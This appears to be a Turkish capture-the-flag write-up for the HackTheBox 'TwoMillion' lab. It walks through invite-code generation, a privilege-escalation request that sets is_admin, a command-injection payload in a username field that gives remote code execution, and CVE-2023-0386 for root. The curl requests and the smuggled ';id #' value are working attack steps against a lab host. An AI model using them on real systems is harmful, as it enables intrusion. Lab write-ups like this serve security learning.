## Web Uygulaması Keşfi

Site eski HTB arayüzünü simüle ediyor. `/invite` sayfasında kayıt olmak için bir davet kodu gerekiyor.

### Invite Code — JS Deobfuscation

`/js/inviteapi.min.js` dosyası pack/obfuscate edilmiş:

```javascript
eval(function(p,a,c,k,e,d){...}(...))
```

Deobfuscate edince iki fonksiyon çıkıyor:
- `makeInviteCode()` → `POST /api/v1/invite/how/to/generate`
- `verifyInviteCode(code)` → `POST /api/v1/invite/verify`

### Davet Kodu Üretme

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
```

```json
{
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"

```

ROT13 decode:


Base64 decode → `XXXXX-XXXXX-XXXXX-XXXXX` formatında davet kodu.

## İlk Erişim (Initial Access)

### Kendini Admin Yapma

`/api/v1/admin/settings/update` endpoint'i herhangi bir kullanıcıyı admin yapabiliyor:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"email":"hax0r99@hack.local","is_admin":1}'
# {"id":13,"username":"hax0r99","is_admin":1}
```

### Command Injection — VPN Generate

`/api/v1/admin/vpn/generate` endpoint'i `username` parametresini shell komutuna doğrudan geçiriyor:

```bash
# Test
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;id #"}'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE doğrulandı.


### Kernel Versiyonu

```bash
uname -a
# Linux 2million 5.15.70-051570-generic #202209231339
```

Kernel 5.15.70 → **CVE-2023-0386** vulnerable!

### CVE-2023-0386 Nedir?

Linux OverlayFS'te SUID bit koruması bypass açığı. Düşük yetkili kullanıcı, FUSE ile fake bir setuid binary oluşturuyor ve OverlayFS üzerinden kopyalarken kernel SUID bitini koruyor. Binary çalıştırılınca root shell veriliyor.
